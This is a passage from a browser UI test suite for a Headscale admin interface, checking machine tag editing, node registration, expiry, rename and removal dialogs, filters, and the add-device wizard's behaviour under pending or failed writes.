  await expect.element(page.getByTestId("expire-node-dialog")).not.toBeInTheDocument();
  expect(ctx.session.drafts.hold({ id: "p", name: "P" })).toBe(false);
});

async function openTags(id = "1") {
  await page.getByTestId(`machine-actions-trigger-${id}`).click();
  await page.getByTestId(`edit-node-tags-action-${id}`).click();
}
// Catches Edit tags starting from stale list data and replacing newer server tags.
test("Edit tags waits for the server tags and appends to them", async () => {
  const ctx = await setup("devices");
  const release = ctx.pause();
  await openTags();
  await expect.element(page.getByTestId("node-tags-input")).toHaveAttribute("readonly");
  await expect.element(page.getByTestId("node-tags-confirm")).toBeDisabled();
  const node = ctx.backend.nodes[0];
  if (!node) throw new Error("Missing fixture node");
  node.tags = ["tag:server", "tag:db"];
  release();
  await expect.element(page.getByTestId("node-tags-input")).toHaveValue("tag:server, tag:db");
  await expect.element(page.getByTestId("node-tags-input")).not.toHaveAttribute("readonly");
  await expect.element(page.getByTestId("node-tags-confirm")).toBeEnabled();
  await page.getByTestId("node-tags-input").fill("tag:server, tag:db, tag:web");
  await page.getByTestId("node-tags-confirm").click();
  await expect.element(page.getByTestId("node-tags-dialog")).not.toBeInTheDocument();
  expect(writes(ctx)).toEqual([
    {
      method: "POST",
      path: "/api/v1/node/1/tags",
      body: { tags: ["tag:server", "tag:db", "tag:web"] },
    },
  ]);
});

// Catches an Edit tags dialog outliving the node it was opened for.
test("Edit tags closes and releases its draft when the node vanishes during the refresh", async () => {
  const ctx = await setup("devices");
  const release = ctx.pause();
  await openTags();
  ctx.backend.nodes = ctx.backend.nodes.filter((n) => n.id !== "1");
  release();
  await expect.element(page.getByTestId("node-tags-dialog")).not.toBeInTheDocument();
  expect(ctx.session.drafts.hold({ id: "p", name: "P" })).toBe(false);
  expect(writes(ctx)).toEqual([]);
});

// Catches a registration owner that the select does not show, or one that no longer exists.
test("pending registration submits the owner the select shows after the users change", async () => {
  const ctx = await setup("devices");
  await openPending();
  await userEvent.keyboard("{Escape}");
  ctx.backend.users = [{ ...bob }, { id: "0", name: "tagged-devices" }];
  await page.getByTestId("refresh-machines").click();
  await expect.poll(() => ctx.session.snapshot.getSnapshot().snapshot.users.length).toBe(2);
  await openPending();
  await expect.element(page.getByTestId("pending-registration-user")).toHaveValue("bob");
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  await page.getByTestId("register-pending-node").click();
  await expect.element(page.getByTestId("registration-result")).toBeVisible();
  expect(writes(ctx)).toEqual([
    { method: "POST", path: "/api/v1/auth/register", body: { user: "bob", authId: AUTH_ID } },
  ]);
});

// Catches registering for a user that is not offered.
test("pending registration with no eligible user is disabled and sends nothing", async () => {
  const ctx = await setup("devices");
  ctx.backend.users = [{ id: "0", name: "tagged-devices" }];
  await page.getByTestId("refresh-machines").click();
  await expect.poll(() => ctx.session.snapshot.getSnapshot().snapshot.users.length).toBe(1);
  await openPending();
  await expect
    .element(page.getByTestId("pending-registration-user"))
    .toHaveTextContent(copy.noUsers);
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  await expect.element(page.getByTestId("register-pending-node")).toBeDisabled();
  expect(writes(ctx)).toEqual([]);
});

// Catches editing the request or switching mode while a decision is in flight.
test("auth request inputs are locked while a write is held and the key clears afterwards", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  let release = ctx.pauseWrites("POST");
  await page.getByTestId("register-pending-node").click();
  await expect.element(page.getByTestId("pending-node-key")).toHaveAttribute("readonly");
  await expect.element(page.getByTestId("pending-registration-kind")).toBeDisabled();
  await expect.element(page.getByTestId("pending-registration-user")).toBeDisabled();
  release();
  await expect.element(page.getByTestId("registration-result")).toBeVisible();
  expect(ctx.session.deviceSetup.getSnapshot().pendingRegistrationForm.key).toBe("");
  await page.getByTestId("add-device-prev").click();
  await expect.element(page.getByTestId("pending-node-key")).toHaveValue("");
  await page.getByTestId("pending-registration-kind").selectOptions("ssh");
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  release = ctx.pauseWrites("POST");
  await page.getByTestId("approve-ssh-check").click();
  await expect.element(page.getByTestId("pending-node-key")).toHaveAttribute("readonly");
  await expect.element(page.getByTestId("pending-registration-kind")).toBeDisabled();
  release();
  await expect.element(page.getByTestId("ssh-check-result")).toBeVisible();
  await expect.element(page.getByTestId("pending-node-key")).toHaveValue("");
});

// Catches Disable expiry on machines that have none, and a missing or wrong write.
test.each([false, true])(
  "Disable expiry is offered only for machines with an expiry (mobile: %s)",
  async (mobile) => {
    const ctx = await setup("devices");
    if (mobile) await page.viewport(390, 640);
    const suffix = mobile ? "-mobile" : "";
    const open = (id: string) => page.getByTestId(`machine-actions-trigger${suffix}-${id}`).click();
    await open("1");
    await expect.element(page.getByTestId(`expire-node-action${suffix}-1`)).toBeVisible();
    await expect
      .element(page.getByTestId(`disable-expiry-node-action${suffix}-1`))
      .not.toBeInTheDocument();
    await userEvent.keyboard("{Escape}");
    await open("2");
    await page.getByTestId(`disable-expiry-node-action${suffix}-2`).click();
    await expect
      .element(page.getByTestId("expire-node-dialog"))
      .toMatchTextContent(copy.disableExpiryTitle);
    await page.getByTestId("expire-node-cancel").click();
    expect(writes(ctx)).toEqual([]);
    await open("2");
    await page.getByTestId(`disable-expiry-node-action${suffix}-2`).click();
    ctx.fail("Cannot disable");
    await page.getByTestId("expire-node-confirm").click();
    await expect
      .element(page.getByTestId("expire-node-error"))
      .toMatchTextContent("Cannot disable");
    ctx.fail("");
    await page.getByTestId("expire-node-confirm").click();
    await expect.element(page.getByTestId("expire-node-dialog")).not.toBeInTheDocument();
    expect(writes(ctx).at(-1)).toEqual({
      method: "POST",
      path: "/api/v1/node/2/expire",
      body: { disableExpiry: "true" },
    });
    await expect.element(page.getByTestId("device-2")).toMatchTextContent("Expires: Never");
    await open("2");
    await expect
      .element(page.getByTestId(`disable-expiry-node-action${suffix}-2`))
      .not.toBeInTheDocument();
  },
);

// Catches reversed or split addresses and routes in right-to-left locales.
test("device addresses and routes stay left-to-right in Arabic", async () => {
  await setup("devices");
  await setLocale("ar");
  try {
    const list = document.querySelector('[data-testid="machine-list"]');
    if (!list) throw new Error("Missing machine list");
    expectNetworkTokensLtr(list, 4);
    await page.getByTestId("device-detail-link-1").click();
    const dialog = document.querySelector('[data-testid="device-detail-dialog"]');
    if (!dialog) throw new Error("Missing detail dialog");
    expectNetworkTokensLtr(dialog, 4);
  } finally {
    await setLocale("en-US");
  }
});

// Catches unlabelled switches, an inert exit-node switch, and focus staying behind the created key.
test("the wizard labels its switches, advertises the exit node and focuses the created key", async () => {
  await setup("devices");
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-client-device").click();
  for (const name of [copy.tags, copy.ephemeral, copy.exitRoute])
    await expect.element(page.getByRole("switch", { name, exact: true })).toBeVisible();
  await expect
    .element(page.getByRole("switch", { name: copy.exitRoute, exact: true }))
    .toHaveAttribute("aria-describedby", "setup-exit-description");
  await page.getByTestId("setup-exit-node").click();
  await page.getByTestId("add-device-next").click();
  await expect
    .element(page.getByRole("switch", { name: copy.reusable, exact: true }))
    .toBeVisible();
  await page.getByTestId("add-device-next").click();
  await page.getByTestId("generate-install-script").click();
  await expect
    .element(page.getByTestId("created-invite"))
    .toMatchTextContent("--advertise-exit-node");
  await expect.element(page.getByRole("group", { name: copy.authKeyCreated })).toHaveFocus();
  const write = vi.spyOn(navigator.clipboard, "writeText").mockResolvedValue();
  await page.getByTestId("copy-setup-install-command").click();
  expect(write).toHaveBeenCalledWith(expect.stringContaining("--advertise-exit-node"));
  await page.getByTestId("add-device-finish").click();
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-client-device").click();
  await expect
    .element(page.getByTestId("setup-exit-node"))
    .toHaveAttribute("aria-checked", "false");
});

// Catches an anonymous table.
test("the devices table is named", async () => {
  await setup("devices");
  await expect.element(page.getByRole("table", { name: copy.devicesTitle })).toBeInTheDocument();
});

// Catches a clipboard rejection that is silent or unhandled.
test("a rejected clipboard write on the install command says so", async () => {
  await setup("devices");
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-client-device").click();
  await page.getByTestId("add-device-next").click();
  await page.getByTestId("add-device-next").click();
  await page.getByTestId("generate-install-script").click();
  await expect.element(page.getByTestId("created-invite")).toBeVisible();
  vi.spyOn(navigator.clipboard, "writeText").mockRejectedValue(new Error("denied"));
  await page.getByTestId("copy-setup-install-command").click();
  await expect
    .element(page.getByTestId("copy-setup-install-command"))
    .toMatchTextContent("Copy failed");
});

function deviceRows() {
  return Array.from(document.querySelectorAll("[data-testid^='device-status-']"), (badge) =>
    String(badge.getAttribute("data-testid")).replace("device-status-", ""),
  );
}
const TAGGED_DEVICES = { id: "0", name: "tagged-devices" };

// Catches a tag-owned machine being attributed to the pseudo owner that Headscale assigns to it.
test("tag-owned machines have no owner link, owner text or owner search match", async () => {
  const ctx = await setup("devices");
  ctx.backend.nodes.push(
    spareNode(ctx, {
      id: "3",
      name: "builder",
      user: TAGGED_DEVICES,
      tags: ["tag:ci"],
      registerMethod: "REGISTER_METHOD_AUTH_KEY",
    }),
  );
  pushNodes(ctx);
  await expect.element(page.getByTestId("device-3")).toBeVisible();
  await page.getByTestId("device-search").fill("tagged-devices");
  await expect.element(page.getByTestId("machine-list")).toMatchTextContent(copy.noDevices);
  await page.getByTestId("device-search").fill("tag:ci");
  await expect.poll(deviceRows).toEqual(["3"]);
  await expect.element(page.getByTestId("device-owner-link-3")).not.toBeInTheDocument();
  const cells = Array.from(document.querySelectorAll("[data-testid='device-3'] td"), (cell) =>
    String(cell.textContent).trim(),
  );
  expect(cells).toContain("-");
  await page.getByTestId("device-detail-link-3").click();
  const dialog = page.getByTestId("device-detail-dialog");
  await expect
    .element(dialog)
    .toMatchTextContent(`${copy.registerMethod}: ${copy.registerMethodAuthKey}`);
  await expect.element(page.getByTestId("device-detail-owner-3")).not.toBeInTheDocument();
  await expect.element(dialog).toMatchTextContent(new RegExp(`${copy.owner}\\s*-`));
  await userEvent.keyboard("{Escape}");
  await expect.element(dialog).not.toBeInTheDocument();
  await page.getByTestId("device-search").fill("");
  await page.getByTestId("device-detail-link-2").click();
  await expect.element(dialog).toBeVisible();
  await expect.element(dialog).not.toMatchTextContent(copy.registerMethod);
});

// Catches the route and tag filters swapping their conditions.
test("the routes and tagged filters list only machines that advertise routes or carry tags", async () => {
  const ctx = await setup("devices");
  ctx.backend.nodes.push(
    spareNode(ctx, { id: "3", name: "tags-only", tags: ["tag:ci"], availableRoutes: [] }),
    spareNode(ctx, {
      id: "4",
      name: "routes-only",
      tags: [],
      availableRoutes: ["192.168.0.0/24"],
    }),
  );
  pushNodes(ctx);
  await page.getByTestId("machine-filter").selectOptions("routes");
  await expect.poll(deviceRows).toEqual(["1", "4"]);
  await page.getByTestId("machine-filter").selectOptions("tagged");
  await expect.poll(deviceRows).toEqual(["1", "3"]);
});

// Catches a prefilled search link that does not reach the machine search.
test("a ?search= link prefills the machine search", async () => {
  await setup("devices", "?search=laptop");
  await expect.element(page.getByTestId("device-search")).toHaveValue("laptop");
  await expect.element(page.getByTestId("device-2")).toBeVisible();
  await expect.element(page.getByTestId("device-1")).not.toBeInTheDocument();
});

// Catches non-numeric input in the expiry field producing NaN or an out-of-range key lifetime.
test("non-numeric or empty text in the key expiry field keeps the last valid days", async () => {
  await setup("devices");
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-linux-device").click();
  await page.getByTestId("add-device-next").click();
  const input = page.getByTestId("setup-expiration");
  await input.fill("40");
  await userEvent.tab();
  await expect.element(input).toHaveValue("40");
  await input.fill("abc");
  await userEvent.tab();
  await expect.element(input).toHaveValue("40");
  await input.fill("");
  await userEvent.tab();
  await expect.element(input).toHaveValue("40");
});

// Catches a close during key creation dropping the dialog (and the key response) mid-request.
test("the wizard cannot be dismissed while the key is being created", async () => {
  const ctx = await setup("devices");
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-linux-device").click();
  await page.getByTestId("add-device-next").click();
  await page.getByTestId("add-device-next").click();
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("generate-install-script").click();
  await expect.poll(() => writes(ctx).length).toBe(1);
  await userEvent.keyboard("{Escape}");
  expect(isDialogOpen("add-device-dialog")).toBe(true);
  await expect.element(page.getByTestId("add-device-finish")).toBeDisabled();
  await expect.element(page.getByTestId("add-device-prev")).toBeDisabled();
  release();
  await expect.element(page.getByTestId("created-invite")).toMatchTextContent("created-key");
  expect(isDialogOpen("add-device-dialog")).toBe(true);
  expect(writes(ctx)).toHaveLength(1);
});

// Catches a rejected registration being treated as a success.
test("a rejected registration keeps the request and shows the server message", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  ctx.fail("Auth request not found", "/api/v1/auth/register", 404);
  await page.getByTestId("register-pending-node").click();
  await expect
    .element(page.getByTestId("register-pending-node-error"))
    .toMatchTextContent("Auth request not found");
  await expect.element(page.getByRole("alert")).toBeVisible();
  await expect.element(page.getByTestId("registration-result")).not.toBeInTheDocument();
  expect(ctx.session.deviceSetup.getSnapshot().pendingRegistrationForm.key).toBe(AUTH_ID);
  ctx.fail("");
  await page.getByTestId("register-pending-node").click();
  await expect.element(page.getByTestId("registration-result")).toBeVisible();
  await expect.element(page.getByTestId("register-pending-node-error")).not.toBeInTheDocument();
});

// Catches a re-unlock that clears the registered node leaving a broken result step.
test("the registration result step renders after the registered node was cleared", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  await page.getByTestId("register-pending-node").click();
  await expect.element(page.getByTestId("registration-result")).toMatchTextContent("registered");
  // Same-server re-unlock clears generated credentials but keeps the wizard where it was.
  ctx.session.deviceSetup.setState({ lastRegisteredNode: null });
  await expect.element(page.getByTestId("registration-result")).toBeEmptyDOMElement();
  await expect.element(page.getByTestId("add-device-finish")).toBeVisible();
});

// Catches a details refresh reopening or keeping a machine that is gone.
test("node details closes when the machine disappears during the opening refresh", async () => {
  const ctx = await setup("devices");
  const release = ctx.pause();
  await page.getByTestId("device-detail-link-1").click();
  await expect.element(page.getByTestId("device-detail-dialog")).toBeVisible();
  ctx.backend.nodes = ctx.backend.nodes.filter((n) => n.id !== "1");
  release();
  await expect.element(page.getByTestId("device-detail-dialog")).not.toBeInTheDocument();
  expect(ctx.session.drafts.hold({ id: "p", name: "P" })).toBe(false);
});

// Catches the origin page's user leaking into a return to a page that takes none.
test("closing details opened from another page returns there without a user", async () => {
  const ctx = await setup("devices", "?node=1&popup=node&from=routes&user=1");
  await expect.element(page.getByTestId("device-detail-dialog")).toBeVisible();
  await userEvent.keyboard("{Escape}");
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/routes");
  expect(ctx.router.state.location.search).toEqual({});
});

// Catches Escape or an outside press discarding a dialog while its write is in flight.
test("Escape cannot dismiss the expire dialog while its write is held", async () => {
  const ctx = await setup("devices");
  await deviceAction("expire", "1");
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("expire-node-confirm").click();
  await expect.poll(() => writes(ctx).length).toBe(1);
  await userEvent.keyboard("{Escape}");
  expect(isDialogOpen("expire-node-dialog")).toBe(true);
  release();
  await expect.element(page.getByTestId("expire-node-dialog")).not.toBeInTheDocument();
  expect(writes(ctx)).toHaveLength(1);
  expect(ctx.session.drafts.hold({ id: "p", name: "P" })).toBe(false);
});

test("Escape cannot dismiss the remove dialog while the delete is held", async () => {
  const ctx = await setup("devices");
  await deviceAction("remove", "2");
  const release = ctx.pauseWrites("DELETE");
  await page.getByTestId("remove-node-confirm").click();
  await expect.poll(() => writes(ctx).length).toBe(1);
  await userEvent.keyboard("{Escape}");
  expect(isDialogOpen("remove-node-dialog")).toBe(true);
  release();
  await expect.element(page.getByTestId("remove-node-dialog")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("device-2")).not.toBeInTheDocument();
  expect(writes(ctx)).toHaveLength(1);
});

test("Escape cannot dismiss the tags dialog while the write is held", async () => {
  const ctx = await setup("devices");
  await openTags();
  await expect.element(page.getByTestId("node-tags-confirm")).toBeEnabled();
  await page.getByTestId("node-tags-input").fill("tag:server, tag:x");
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("node-tags-confirm").click();
  await expect.poll(() => writes(ctx).length).toBe(1);
  await userEvent.keyboard("{Escape}");
  expect(isDialogOpen("node-tags-dialog")).toBe(true);
  await expect.element(page.getByTestId("node-tags-input")).toHaveValue("tag:server, tag:x");
  release();
  await expect.element(page.getByTestId("node-tags-dialog")).not.toBeInTheDocument();
  expect(writes(ctx)).toHaveLength(1);
});

// Catches a failed tags write closing the dialog and dropping the draft.
test("a rejected tags write keeps the dialog and shows the error", async () => {
  const ctx = await setup("devices");
  await openTags();
  await expect.element(page.getByTestId("node-tags-confirm")).toBeEnabled();
  await page.getByTestId("node-tags-input").fill("tag:server, tag:x");
  ctx.fail("Tags denied", "/api/v1/node/1/tags");
  await page.getByTestId("node-tags-confirm").click();
  await expect.element(page.getByTestId("node-tags-error")).toMatchTextContent("Tags denied");
  await expect.element(page.getByTestId("node-tags-dialog")).toBeVisible();
  expect(ctx.backend.nodes[0]?.tags).toEqual(["tag:server"]);
  ctx.fail("");
  await page.getByTestId("node-tags-confirm").click();
  await expect.element(page.getByTestId("node-tags-dialog")).not.toBeInTheDocument();
  expect(ctx.backend.nodes[0]?.tags).toEqual(["tag:server", "tag:x"]);
});

// Catches a failed delete closing the dialog as if the machine were gone.
test("a rejected remove keeps the machine and the dialog", async () => {
  const ctx = await setup("devices");
  await deviceAction("remove", "2");
  ctx.fail("Cannot remove");
  await page.getByTestId("remove-node-confirm").click();
  await expect.element(page.getByTestId("remove-node-error")).toMatchTextContent("Cannot remove");
  await expect.element(page.getByTestId("remove-node-dialog")).toBeVisible();
  await expect.element(page.getByTestId("device-2")).toBeVisible();
  ctx.fail("");
  await page.getByTestId("remove-node-confirm").click();
  await expect.element(page.getByTestId("device-2")).not.toBeInTheDocument();
});

// Catches an empty rename reaching Headscale, or the old name being sent as if it were new.
test("a blank machine name cannot be saved", async () => {
  const ctx = await setup("devices");
  await deviceAction("rename", "2");
  await page.getByTestId("rename-node-dialog-input").fill("");
  await expect.element(page.getByTestId("rename-node-confirm")).toBeDisabled();
  await userEvent.keyboard("{Enter}");
  await expect.element(page.getByTestId("rename-node-dialog")).toBeVisible();
  expect(writes(ctx)).toEqual([]);
});

// Catches ordinary typing in the rename field submitting the form early.
test("typing in the rename field does not submit until Enter", async () => {
  const ctx = await setup("devices");
  await deviceAction("rename");
  await page.getByTestId("rename-node-dialog-input").click();
  await userEvent.keyboard("{End}-x");
  await expect.element(page.getByTestId("rename-node-dialog-input")).toHaveValue("edge-router-x");
  expect(writes(ctx)).toEqual([]);
  await userEvent.keyboard("{Enter}");
  await expect.element(page.getByTestId("rename-node-dialog")).not.toBeInTheDocument();
  expect(writes(ctx)).toEqual([
    { method: "POST", path: "/api/v1/node/1/rename/edge-router-x", body: {} },
  ]);
});
